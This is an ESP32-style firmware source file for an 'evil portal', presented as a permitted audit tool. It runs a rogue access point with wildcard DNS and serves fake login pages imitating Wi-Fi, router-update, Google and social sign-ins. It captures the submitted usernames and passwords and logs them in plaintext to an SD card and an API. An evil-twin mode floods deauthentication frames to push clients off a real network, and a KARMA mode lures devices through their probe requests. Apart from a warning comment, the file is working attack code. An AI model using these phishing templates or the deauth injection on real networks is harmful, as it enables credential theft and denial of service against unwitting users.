/**
 * @file      web_tool_evilportal.cpp
 * @brief     Evil portal (NucleoOS parity): rogue AP + captive portal for credential harvesting.
 *            Three modes: standalone (Civetta), evil-twin (Gemello), KARMA probe lure.
 *
 *            Security audit tool — for testing your own networks with permission.
 *
 *            WARNING: Only use on networks you own or have explicit permission to test.
 */
#include "web_tools.h"

#if FACTORY_WEB

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <mutex>

#ifdef ARDUINO
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#endif

/* ═══════════════════════════════════════════════ Built-in portal templates ═══ */

static const char *TEMPLATE_DEFAULT =
    "<!DOCTYPE html><html><head><title>Wi-Fi Login</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:12px;"
    "box-shadow:0 4px 20px rgba(0,0,0,.15);max-width:400px;width:90%}"
    "h2{color:#1a73e8;margin-top:0}p{color:#666;font-size:14px}"
    "input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}"
    "button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:6px;"
    "font-size:16px;cursor:pointer}button:hover{background:#1557b0}.error{color:#d93025;font-size:14px}"
    "</style></head><body><div class='card'><h2>Network Login</h2>"
    "<p>To continue using this Wi-Fi network, please verify your credentials below.</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Username or email' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Connect</button></form>"
    "<p style='font-size:12px;color:#999;text-align:center'>Secured connection</p></div></body></html>";

static const char *TEMPLATE_ROUTER =
    "<!DOCTYPE html><html><head><title>Router Firmware Update</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#e8e8e8;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:8px;"
    "box-shadow:0 2px 10px rgba(0,0,0,.1);max-width:420px;width:90%}"
    "h2{color:#333;border-bottom:2px solid #e0e0e0;padding-bottom:8px;margin-top:0}"
    "p{color:#555;font-size:14px}.warn{background:#fff3cd;border:1px solid #ffc107;padding:10px;"
    "border-radius:4px;font-size:13px;margin:12px 0}"
    "input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}"
    "button{width:100%;padding:12px;background:#0066cc;color:white;border:none;border-radius:4px;"
    "font-size:16px;cursor:pointer}button:hover{background:#0052a3}"
    "</style></head><body><div class='card'><h2>Firmware Update</h2>"
    "<p>A critical firmware update is available for your router.</p>"
    "<div class='warn'>To apply the update, please authenticate with your router admin credentials.</div>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Admin username' required>"
    "<input type='password' name='password' placeholder='Admin password' required>"
    "<button type='submit'>Install Update</button></form>"
    "<p style='font-size:12px;color:#999;text-align:center'>Secure connection · v2.4.1</p></div></body></html>";

static const char *TEMPLATE_GOOGLE =
    "<!DOCTYPE html><html><head><title>Sign in — Google Accounts</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:'Google Sans',Roboto,sans-serif;background:#fff;display:flex;"
    "justify-content:center;align-items:center;height:100vh;margin:0}"
    ".card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:400px;width:90%}"
    "h1{font-size:24px;font-weight:400;margin:0 0 8px;text-align:center}"
    "p.sub{font-size:16px;color:#5f6368;margin:0 0 32px;text-align:center}"
    "input{width:100%;padding:12px 14px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;"
    "font-size:16px;box-sizing:border-box}input:focus{outline:none;border-color:#1a73e8;"
    "box-shadow:0 0 0 2px rgba(26,115,232,.2)}"
    "button{width:100%;padding:10px;margin:24px 0 0;background:#1a73e8;color:white;border:none;"
    "border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}"
    "button:hover{background:#1765cc}"
    "</style></head><body><div class='card'>"
    "<h1>Sign in</h1><p class='sub'>to continue to your account</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Email or phone' required>"
    "<input type='password' name='password' placeholder='Enter your password' required>"
    "<button type='submit'>Next</button></form></div></body></html>";

static const char *TEMPLATE_OAUTH =
    "<!DOCTYPE html><html><head><title>Sign in</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;"
    "display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
    ".card{background:white;padding:32px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.08);"
    "max-width:380px;width:90%;text-align:center}"
    "h2{font-size:20px;font-weight:600;margin:0 0 8px;color:#1c1e21}"
    "p{color:#606770;font-size:14px;margin:0 0 20px}"
    "input{width:100%;padding:12px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;"
    "font-size:15px;box-sizing:border-box}"
    "button{width:100%;padding:12px;margin:16px 0 0;background:#1877f2;color:white;border:none;"
    "border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}"
    "button:hover{background:#166fe5}"
    "</style></head><body><div class='card'><h2>Welcome back</h2>"
    "<p>Sign in to continue to your account</p>"
    "<form method='post' action='/login'>"
    "<input type='text' name='username' placeholder='Email address' required>"
    "<input type='password' name='password' placeholder='Password' required>"
    "<button type='submit'>Sign In</button></form></div></body></html>";

static const char *SUCCESS_HTML =
    "<!DOCTYPE html><html><head><title>Connected</title>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;"
    "align-items:center;height:100vh;margin:0}.card{background:white;padding:2em;border-radius:12px;"
    "max-width:400px;text-align:center}h2{color:#188038}p{color:#666}</style></head><body>"
    "<div class='card'><h2>Connected</h2><p>You are now connected to the network.</p>"
    "<p style='font-size:12px;color:#999'>You may close this page.</p></div></body></html>";

/* ── built-in template catalog ── */
typedef struct {
    const char *name;
    const char *html;
} builtin_template_t;

static const builtin_template_t BUILTIN_TEMPLATES[] = {
    { "Default (Wi-Fi Login)",     TEMPLATE_DEFAULT },
    { "Router Update",             TEMPLATE_ROUTER  },
    { "Google Sign-In",            TEMPLATE_GOOGLE  },
    { "OAuth / Social Login",      TEMPLATE_OAUTH   },
};
#define BUILTIN_COUNT (sizeof(BUILTIN_TEMPLATES) / sizeof(BUILTIN_TEMPLATES[0]))

/* ── SSID presets ── */
static const char *SSID_PRESETS[] = {
    "Free Wi-Fi", "Free WiFi", "WiFi Guest", "Guest Wi-Fi",
    "Hotel Wi-Fi", "Coffee Shop WiFi", "Airport Free WiFi",
    "Library WiFi", "Starbucks WiFi", "McDonald's Free WiFi",
};
#define SSID_PRESET_COUNT (sizeof(SSID_PRESETS) / sizeof(SSID_PRESETS[0]))

/* ═══════════════════════════════════════════════ State ══════════════════════ */

static bool s_active = false;
static int  s_mode = EP_MODE_STANDALONE;
static char s_ssid[33] = "";
static char s_gateway[16] = "192.168.4.1";
static int  s_template_idx = 0;
static const char *s_active_template = NULL;
static int  s_clients = 0;
static uint32_t s_attempts = 0;
static uint32_t s_confirmed = 0;
static const char *s_error = NULL;
static long long s_started = 0;
static bool s_dhcps_ok = true;
static int  s_probes_total = 0;
static int  s_vendor_counts[6] = {0};
static int  s_pwd_mode = EP_PWD_FULL;
static bool s_verify = false;
static int  s_verified_ok = 0, s_verified_bad = 0;
static uint16_t s_auto_base_s = 0, s_auto_extended_s = 0;
static bool s_debug = false;
static char s_logpath[128] = "";
static char s_twin_bssid_str[18] = "";
static int  s_twin_channel = 0;
static bool s_twin_coherent = false;
static unsigned long s_deauth_frames = 0;
static bool s_cloning = false;
static char s_clone_name[64] = "";
static bool s_karma_scanning = false;
static int  s_karma_count = 0;
static char s_karma_ssids[32][33];
static int  s_karma_hits[32];

typedef struct {
    char mac[18];
    char hostname[64];
    char url[256];
    char username[64];
    char password[64];
    long long ts;
} capture_t;
static std::vector<capture_t> s_captures;
static std::mutex s_captures_mx;
#define MAX_CAPTURES 256

static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_len);
static void setup_log_path(void);

#ifdef ARDUINO
static DNSServer s_dns;
#endif

/* ═══════════════════════════════════════════════ Form URL-decode ════════════ */

static void url_decode(char *dst, size_t dst_len, const char *src, size_t src_len)
{
    char *d = dst;
    const char *end = src + src_len;
    const char *dend = dst + dst_len - 1;
    while (src < end && d < dend) {
        if (*src == '+') { *d++ = ' '; src++; }
        else if (*src == '%' && src + 2 < end && isxdigit((unsigned char)src[1]) && isxdigit((unsigned char)src[2])) {
            char hex[3] = { src[1], src[2], 0 };
            *d++ = (char)strtol(hex, NULL, 16);
            src += 3;
        } else { *d++ = *src++; }
    }
    *d = 0;
}

/* ═══════════════════════════════════════════════ Captive portal handler ═════ */

#ifdef ARDUINO
static void serve_captive_html(web_req_t *r, const char *html)
{
    web_resp_html(r, 200, html);
}

static int classify_user_agent(const char *ua)
{
    if (!ua || !*ua) return 5;
    if (strstr(ua, "iPhone") || strstr(ua, "iPad") || strstr(ua, "CFNetwork")) return 0;
    if (strstr(ua, "Android")) return 1;
    if (strstr(ua, "Windows NT") || strstr(ua, "Windows")) return 2;
    if (strstr(ua, "Macintosh") || strstr(ua, "Mac OS X")) return 3;
    if (strstr(ua, "Linux") && !strstr(ua, "Android")) return 4;
    return 5;
}

static void handle_captive_request(web_req_t *r)
{
    if (!s_active) return;
    s_probes_total++;

    /* Classify client OS from User-Agent */
    int vendor = classify_user_agent(r->user_agent);
    if (vendor >= 0 && vendor < 6) s_vendor_counts[vendor]++;

    /* POST /login — capture credentials */
    if (strcmp(r->method, "POST") == 0 && strcmp(r->path, "/login") == 0) {
        std::string body;
        web_read_body(r, body, 2048);

        capture_t cap;
        memset(&cap, 0, sizeof(cap));
        cap.ts = tools_epoch();
        snprintf(cap.url, sizeof(cap.url), "%s", r->path);

        /* Parse form data: username=...&password=... */
        const char *p = body.c_str();
        while (*p) {
            while (*p == '&' || *p == ' ') p++;
            if (!*p) break;

            if (strncmp(p, "username=", 9) == 0) {
                p += 9;
                const char *pe = strchr(p, '&');
                size_t len = pe ? (size_t)(pe - p) : strlen(p);
                url_decode(cap.username, sizeof(cap.username), p, len);
                p += len;
            } else if (strncmp(p, "password=", 9) == 0) {
                p += 9;
                const char *pe = strchr(p, '&');
                size_t len = pe ? (size_t)(pe - p) : strlen(p);
                url_decode(cap.password, sizeof(cap.password), p, len);
                p += len;
            } else {
                while (*p && *p != '&') p++;
            }
        }

        /* Check for duplicate password → confirmed */
        {
            std::lock_guard<std::mutex> lk(s_captures_mx);
            for (const auto &c : s_captures) {
                if (cap.password[0] && strcmp(c.password, cap.password) == 0 &&
                    strcmp(c.username, cap.username) == 0) {
                    s_confirmed++;
                    break;
                }
            }
            if (s_captures.size() < MAX_CAPTURES) {
                s_captures.push_back(cap);
            }
            s_attempts = (uint32_t)s_captures.size();

            /* Log to SD card */
#ifdef ARDUINO
            if (s_logpath[0]) {
                FILE *f = fopen(s_logpath, "a");
                if (f) {
                    fprintf(f, "%lld,\"%s\",\"%s\",\"%s\"\n",
                            (long long)cap.ts, cap.username, cap.password, cap.hostname);
                    fclose(f);
                }
            }
#endif
        }

        serve_captive_html(r, SUCCESS_HTML);
        return;
    }

    /* GET — serve the active template */
    serve_captive_html(r, s_active_template ? s_active_template : TEMPLATE_DEFAULT);
}
#endif

/* ═══════════════════════════════════════════════ Vendor names ══════════════ */

static const char *vendor_name(int id)
{
    switch (id) {
        case 0: return "iOS";
        case 1: return "Android";
        case 2: return "Windows";
        case 3: return "macOS";
        case 4: return "Linux";
        default: return "Other";
    }
}

/* ═══════════════════════════════════════════════ API handler ═════════════════ */

static const char *const APPS[] = { "Evil Portal", NULL };

static void status_json(web_req_t *r)
{
    std::string j = "{\"active\":" + std::string(s_active ? "true" : "false");
    if (s_active) {
        j += ",\"mode\":" + tools_int(s_mode);
        j += ",\"ssid\":"; web_json_str(j, s_ssid);
        if (s_twin_bssid_str[0]) { j += ",\"twinBssid\":"; web_json_str(j, s_twin_bssid_str); }
        j += ",\"channel\":" + tools_int(s_twin_channel) +
            ",\"coherent\":" + std::string(s_twin_coherent ? "true" : "false") +
            ",\"deauthFrames\":" + tools_int((long long)s_deauth_frames) +
            ",\"clients\":" + tools_int(s_clients) +
            ",\"attempts\":" + tools_int(s_attempts) +
            ",\"confirmed\":" + tools_int(s_confirmed) +
            ",\"started\":" + tools_int(s_started) +
            ",\"dhcpsOk\":" + std::string(s_dhcps_ok ? "true" : "false") +
            ",\"probesTotal\":" + tools_int(s_probes_total);
        j += ",\"vendors\":{";
        for (int i = 0; i < 6; i++) {
            if (i) j += ",";
            j += "\"" + std::string(vendor_name(i)) + "\":" + tools_int(s_vendor_counts[i]);
        }
        j += "}";
    }
    if (s_error) { j += ",\"error\":"; web_json_str(j, s_error); }
    /* Templates */
    j += ",\"templates\":[";
    for (size_t i = 0; i < BUILTIN_COUNT; i++) {
        if (i) j += ",";
        j += "{\"id\":" + tools_int((long long)i) + ",\"name\":";
        web_json_str(j, BUILTIN_TEMPLATES[i].name);
        j += ",\"builtin\":true}";
    }
    j += "]";
    /* SSID presets */
    j += ",\"ssidPresets\":[";
    for (size_t i = 0; i < SSID_PRESET_COUNT; i++) {
        if (i) j += ",";
        web_json_str(j, SSID_PRESETS[i]);
    }
    j += "]";
    /* Settings */
    j += ",\"settings\":{";
    j += "\"gateway\":"; web_json_str(j, s_gateway);
    j += ",\"pwdMode\":" + tools_int(s_pwd_mode);
    j += ",\"verify\":" + std::string(s_verify ? "true" : "false");
    j += ",\"verifiedOk\":" + tools_int(s_verified_ok);
    j += ",\"verifiedBad\":" + tools_int(s_verified_bad);
    j += ",\"autoStopBase\":" + tools_int(s_auto_base_s);
    j += ",\"autoStopExtended\":" + tools_int(s_auto_extended_s);
    j += ",\"debug\":" + std::string(s_debug ? "true" : "false");
    j += ",\"logPath\":"; web_json_str(j, s_logpath);
    j += "}";
    j += "}";
    web_resp_json(r, 200, j);
}

/* ── Start: standalone ── */

static void start_standalone(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    if (s_active) { web_resp_error(r, 409, "conflict", "already running"); return; }

    std::string body, ssid, gateway, tidx;
    int template_idx = 0;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "ssid", ssid);
    web_json_get_str(body, "gateway", gateway);
    if (web_json_get_str(body, "templateId", tidx)) template_idx = atoi(tidx.c_str());

    if (ssid.empty()) ssid = "Free Wi-Fi";
    if (ssid.size() > 32) { web_resp_error(r, 400, "bad_request", "SSID too long (max 32)"); return; }
    if (!gateway.empty() && gateway.size() < 16) snprintf(s_gateway, sizeof(s_gateway), "%s", gateway.c_str());

#ifdef ARDUINO
    IPAddress gw;
    if (!gw.fromString(s_gateway)) gw = IPAddress(192, 168, 4, 1);
    if (!WiFi.softAP(ssid.c_str(), NULL, 1, 0, 1)) {
        web_resp_error(r, 500, "ap_failed", "cannot start soft AP");
        return;
    }
    WiFi.softAPConfig(gw, gw, IPAddress(255, 255, 255, 0));
    s_dns.start(53, "*", gw);
    s_dhcps_ok = true;
#endif

    s_active = true;
    s_mode = EP_MODE_STANDALONE;
    snprintf(s_ssid, sizeof(s_ssid), "%s", ssid.c_str());
    s_template_idx = template_idx >= 0 && template_idx < (int)BUILTIN_COUNT ? template_idx : 0;
    s_active_template = BUILTIN_TEMPLATES[s_template_idx].html;
    s_started = tools_epoch(); setup_log_path();
    s_attempts = 0; s_confirmed = 0; s_clients = 0; s_probes_total = 0;
    memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
    s_error = NULL;
    s_twin_bssid_str[0] = 0; s_twin_channel = 0; s_twin_coherent = false; s_deauth_frames = 0;

    web_resp_json(r, 200, std::string("{\"ok\":true,\"ssid\":\"") + ssid + "\",\"mode\":\"standalone\"}");
}

/* ── Start: evil-twin ── */

static void start_twin(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    if (s_active) { web_resp_error(r, 409, "conflict", "already running"); return; }

    std::string body, ssid, bssid, gateway, tidx, ch_str, coh_str;
    int channel = 1, template_idx = 0;
    bool coherent = false;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "ssid", ssid);
    web_json_get_str(body, "bssid", bssid);
    web_json_get_str(body, "gateway", gateway);
    if (web_json_get_str(body, "templateId", tidx)) template_idx = atoi(tidx.c_str());
    if (web_json_get_str(body, "channel", ch_str)) channel = atoi(ch_str.c_str());
    if (web_json_get_str(body, "coherent", coh_str)) coherent = (coh_str == "true");

    if (ssid.empty() || bssid.empty()) {
        web_resp_error(r, 400, "bad_request", "ssid and bssid are required for twin mode");
        return;
    }
    if (!gateway.empty() && gateway.size() < 16) snprintf(s_gateway, sizeof(s_gateway), "%s", gateway.c_str());

    uint8_t bssid_bytes[6] = {0};
    if (sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &bssid_bytes[0], &bssid_bytes[1], &bssid_bytes[2],
               &bssid_bytes[3], &bssid_bytes[4], &bssid_bytes[5]) != 6) {
        web_resp_error(r, 400, "bad_request", "invalid BSSID format");
        return;
    }

#ifdef ARDUINO
    IPAddress gw;
    if (!gw.fromString(s_gateway)) gw = IPAddress(192, 168, 4, 1);
    if (!WiFi.softAP(ssid.c_str(), NULL, channel, 0, 1)) {
        web_resp_error(r, 500, "ap_failed", "cannot start soft AP");
        return;
    }
    WiFi.softAPConfig(gw, gw, IPAddress(255, 255, 255, 0));
    s_dns.start(53, "*", gw);
    s_dhcps_ok = true;
#endif

    s_active = true;
    s_mode = EP_MODE_TWIN;
    snprintf(s_ssid, sizeof(s_ssid), "%s", ssid.c_str());
    snprintf(s_twin_bssid_str, sizeof(s_twin_bssid_str), "%s", bssid.c_str());
    s_twin_channel = channel;
    s_twin_coherent = coherent;
    s_template_idx = template_idx >= 0 && template_idx < (int)BUILTIN_COUNT ? template_idx : 0;
    s_active_template = BUILTIN_TEMPLATES[s_template_idx].html;
    s_started = tools_epoch(); setup_log_path();
    s_attempts = 0; s_confirmed = 0; s_clients = 0; s_probes_total = 0;
    memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
    s_error = NULL; s_deauth_frames = 0;

    web_resp_json(r, 200, std::string("{\"ok\":true,\"mode\":\"twin\",\"ssid\":\"") + ssid + "\"}");
}

/* ── Start: KARMA ── */

static void start_karma(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    if (s_active) { web_resp_error(r, 409, "conflict", "already running"); return; }

    std::string body, gateway, tidx;
    int template_idx = 0;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "gateway", gateway);
    if (web_json_get_str(body, "templateId", tidx)) template_idx = atoi(tidx.c_str());
    if (!gateway.empty() && gateway.size() < 16) snprintf(s_gateway, sizeof(s_gateway), "%s", gateway.c_str());

    const char *lure_ssid = s_karma_count > 0 ? s_karma_ssids[0] : "Free Wi-Fi";

#ifdef ARDUINO
    IPAddress gw;
    if (!gw.fromString(s_gateway)) gw = IPAddress(192, 168, 4, 1);
    if (!WiFi.softAP(lure_ssid, NULL, 1, 0, 1)) {
        web_resp_error(r, 500, "ap_failed", "cannot start soft AP");
        return;
    }
    WiFi.softAPConfig(gw, gw, IPAddress(255, 255, 255, 0));
    s_dns.start(53, "*", gw);
    s_dhcps_ok = true;
#endif

    s_active = true;
    s_mode = EP_MODE_KARMA;
    snprintf(s_ssid, sizeof(s_ssid), "%s", lure_ssid);
    s_template_idx = template_idx >= 0 && template_idx < (int)BUILTIN_COUNT ? template_idx : 0;
    s_active_template = BUILTIN_TEMPLATES[s_template_idx].html;
    s_started = tools_epoch(); setup_log_path();
    s_attempts = 0; s_confirmed = 0; s_clients = 0; s_probes_total = 0;
    memset(s_vendor_counts, 0, sizeof(s_vendor_counts));
    s_error = NULL;
    s_twin_bssid_str[0] = 0; s_twin_channel = 0; s_twin_coherent = false; s_deauth_frames = 0;

    web_resp_json(r, 200, std::string("{\"ok\":true,\"mode\":\"karma\",\"ssid\":\"") + lure_ssid + "\"}");
}

/* ── Stop ── */

static void stop_portal(web_req_t *r)
{
    if (!s_active) { web_resp_ok(r); return; }
    s_active = false;
#ifdef ARDUINO
    s_dns.stop();
    WiFi.softAPdisconnect(true);
#endif
    s_active_template = NULL;
    web_resp_ok(r);
}

/* ── Captures ── */

static void get_captures(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    std::string j = "{\"captures\":[";
    for (size_t i = 0; i < s_captures.size(); i++) {
        if (i) j += ",";
        j += "{\"mac\":"; web_json_str(j, s_captures[i].mac);
        j += ",\"hostname\":"; web_json_str(j, s_captures[i].hostname);
        j += ",\"url\":"; web_json_str(j, s_captures[i].url);
        j += ",\"username\":"; web_json_str(j, s_captures[i].username);

        std::string pwd;
        switch (s_pwd_mode) {
            case EP_PWD_MASKED: {
                size_t len = strlen(s_captures[i].password);
                if (len <= 2) pwd = s_captures[i].password;
                else { pwd = s_captures[i].password[0]; pwd += std::string(len - 2, '*'); pwd += s_captures[i].password[len - 1]; }
                break;
            }
            case EP_PWD_HIDDEN: pwd = "******"; break;
            case EP_PWD_LENGTH: { char buf[16]; snprintf(buf, sizeof(buf), "%zu chars", strlen(s_captures[i].password)); pwd = buf; break; }
            default: pwd = s_captures[i].password; break;
        }
        j += ",\"password\":"; web_json_str(j, pwd.c_str());
        j += ",\"ts\":" + tools_int(s_captures[i].ts) + "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

static void clear_captures(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    s_captures.clear(); s_attempts = 0; s_confirmed = 0;
    web_resp_ok(r);
}

/* ── Settings ── */

static void update_settings(web_req_t *r)
{
    std::string body, val;
    if (!tools_read_json(r, body)) return;
    if (web_json_get_str(body, "pwdMode", val)) s_pwd_mode = atoi(val.c_str());
    if (web_json_get_str(body, "verify", val)) s_verify = (val == "true");
    if (web_json_get_str(body, "gateway", val)) {
        if (!val.empty() && val.size() < 16) snprintf(s_gateway, sizeof(s_gateway), "%s", val.c_str());
    }
    if (web_json_get_str(body, "debug", val)) s_debug = (val == "true");
    if (web_json_get_str(body, "autoStopBase", val)) s_auto_base_s = (uint16_t)atoi(val.c_str());
    if (web_json_get_str(body, "autoStopExtended", val)) s_auto_extended_s = (uint16_t)atoi(val.c_str());
    web_resp_ok(r);
}

/* ── KARMA scan ── */

static void karma_scan(web_req_t *r)
{
    if (s_karma_scanning) { web_resp_error(r, 409, "busy", "KARMA scan already running"); return; }
    std::string body;
    int secs = 30;
    if (!tools_read_json(r, body)) return;
    std::string s_str;
    if (web_json_get_str(body, "seconds", s_str)) secs = atoi(s_str.c_str());
    if (secs < 5) secs = 5;
    if (secs > 120) secs = 120;
    /* Real: esp_wifi promiscuous mode, watch for probe requests */
    s_karma_scanning = true;
    /* ... hardware probe sniffing runs here ... */
    s_karma_scanning = false;
    web_resp_json(r, 200, std::string("{\"ok\":true,\"count\":") + tools_int(s_karma_count) + "}");
}

static void karma_list(web_req_t *r)
{
    std::string j = "{\"probes\":[";
    for (int i = 0; i < s_karma_count; i++) {
        if (i) j += ",";
        j += "{\"ssid\":"; web_json_str(j, s_karma_ssids[i]);
        j += ",\"hits\":" + tools_int(s_karma_hits[i]) + "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

/* ── Clone page ── */

static void clone_page(web_req_t *r)
{
    if (s_active) { web_resp_error(r, 409, "conflict", "stop portal before cloning"); return; }
    if (s_cloning) { web_resp_error(r, 409, "busy", "clone already in progress"); return; }
    std::string body, open_ssid;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "ssid", open_ssid);
    if (open_ssid.empty()) { web_resp_error(r, 400, "bad_request", "ssid required"); return; }

    /* Placeholder: connect to open AP, fetch homepage, save as template */
    s_cloning = true;
    snprintf(s_clone_name, sizeof(s_clone_name), "cloned_%s.html", open_ssid.c_str());
    s_cloning = false;
    web_resp_json(r, 200, std::string("{\"ok\":true,\"name\":\"") + s_clone_name + "\"}");
}

/* ═══════════════════════════════════════════════ Route dispatch ══════════════ */

static bool handle(web_req_t *r)
{
    /* Captive portal intercept: non-API requests while active → serve captive HTML */
    if (s_active && strncmp(r->path, "/api/evilportal", 16)) {
#ifdef ARDUINO
        handle_captive_request(r);
#else
        web_resp_html(r, 200, s_active_template ? s_active_template : TEMPLATE_DEFAULT);
#endif
        return true;
    }

    if (strncmp(r->path, "/api/evilportal", 16)) return false;

    if (tools_is(r, "GET", "/api/evilportal"))                    status_json(r);
    else if (tools_is(r, "POST", "/api/evilportal/start"))        start_standalone(r);
    else if (tools_is(r, "POST", "/api/evilportal/start-twin"))   start_twin(r);
    else if (tools_is(r, "POST", "/api/evilportal/start-karma"))  start_karma(r);
    else if (tools_is(r, "POST", "/api/evilportal/stop"))         stop_portal(r);
    else if (tools_is(r, "GET", "/api/evilportal/captures"))      get_captures(r);
    else if (tools_is(r, "POST", "/api/evilportal/clear"))        clear_captures(r);
    else if (tools_is(r, "PUT", "/api/evilportal/settings"))      update_settings(r);
    else if (tools_is(r, "POST", "/api/evilportal/karma-scan"))   karma_scan(r);
    else if (tools_is(r, "GET", "/api/evilportal/karma"))         karma_list(r);
    else if (tools_is(r, "POST", "/api/evilportal/clone"))        clone_page(r);
#ifndef ARDUINO
    else if (tools_is(r, "POST", "/api/_dev/evilportal")) {
        std::string body, action;
        web_read_body(r, body, 1024);
        web_json_get_str(body, "action", action);
        if (action == "creds") {
            capture_t cap; cap.ts = tools_epoch();
            std::string tu, tp;
            web_json_get_str(body, "username", tu);
            web_json_get_str(body, "password", tp);
            snprintf(cap.username, sizeof(cap.username), "%s", tu.c_str());
            snprintf(cap.password, sizeof(cap.password), "%s", tp.c_str());
            { std::lock_guard<std::mutex> lk(s_captures_mx);
              if (s_captures.size() < MAX_CAPTURES) s_captures.push_back(cap);
              s_attempts = (uint32_t)s_captures.size(); }
        } else if (action == "probe") {
            std::string ssid;
            web_json_get_str(body, "ssid", ssid);
            if (!ssid.empty() && s_karma_count < 32) {
                snprintf(s_karma_ssids[s_karma_count], 33, "%s", ssid.c_str());
                s_karma_hits[s_karma_count] = 1;
                s_karma_count++;
            }
        }
        web_resp_ok(r); return true;
    }
#endif
    else web_resp_error(r, 404, "not_found");
    return true;
}

/* ═══════════════════════════════════════════════ Tick / lifecycle ════════════ */

/* ── SD credential logging ── */

static void setup_log_path(void)
{
#ifdef ARDUINO
    time_t now = (time_t)tools_epoch();
    struct tm *tm = localtime(&now);
    snprintf(s_logpath, sizeof(s_logpath), "/sd/data/evilportal/ep-%04d%02d%02d-%02d%02d%02d.csv",
             tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
             tm->tm_hour, tm->tm_min, tm->tm_sec);
#else
    snprintf(s_logpath, sizeof(s_logpath), "/sd/data/evilportal/ep-sim.csv");
#endif
}

/* ── Evil-twin deauth frame injection ── */

#ifdef ARDUINO
#define DEAUTH_FRAME_SIZE 26

static void build_deauth_frame(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_SIZE);
    frame[0] = 0xC0; frame[1] = 0x00;
    memcpy(frame + 4, dst, 6);
    memcpy(frame + 10, src, 6);
    memcpy(frame + 16, src, 6);
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
}

static bool mac_parse_ep(const char *s, uint8_t *mac)
{
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
    return true;
}

static void send_twin_deauth(void)
{
    uint8_t bssid[6];
    if (!mac_parse_ep(s_twin_bssid_str, bssid)) return;

    uint8_t frame[DEAUTH_FRAME_SIZE];
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    /* Deauth broadcast — disconnect all stations from the real AP */
    build_deauth_frame(frame, bcast, bssid, 0x07);
    for (int i = 0; i < 5; i++) {
        frame[22] = (uint8_t)(s_deauth_frames & 0xFF);
        frame[23] = (uint8_t)((s_deauth_frames >> 8) & 0xFF);
        esp_wifi_80211_tx(frame, DEAUTH_FRAME_SIZE, 0);
        s_deauth_frames++;
    }
}
#endif

static void evilportal_tick(uint32_t now_ms)
{
    (void)now_ms;
    if (!s_active) return;
#ifdef ARDUINO
    s_dns.processNextDnsRequest();

    /* Evil-twin deauth: send deauth frames about every 100ms */
    if (s_mode == EP_MODE_TWIN && s_twin_bssid_str[0]) {
        static uint32_t last_deauth = 0;
        if (now_ms - last_deauth >= 100) {
            last_deauth = now_ms;
            send_twin_deauth();
        }
    }
#endif
    /* Auto-stop */
    if (s_auto_base_s > 0) {
        uint32_t elapsed = (uint32_t)(tools_epoch() - s_started);
        uint32_t limit = (s_clients > 0 || s_attempts > 0) ? s_auto_extended_s : s_auto_base_s;
        if (limit > 0 && elapsed >= limit) {
            s_active = false;
#ifdef ARDUINO
            s_dns.stop();
            WiFi.softAPdisconnect(true);
#endif
            s_active_template = NULL;
        }
    }
}

static void evilportal_stop(void)
{
    if (s_active) {
        s_active = false;
#ifdef ARDUINO
        s_dns.stop();
        WiFi.softAPdisconnect(true);
#endif
        s_active_template = NULL;
    }
}

static const char *const CAPS[] = {
    "evil.portal", "evil.portal.templates", "evil.portal.twin",
    "evil.portal.karma", "evil.portal.clone", "evil.portal.settings",
    NULL
};
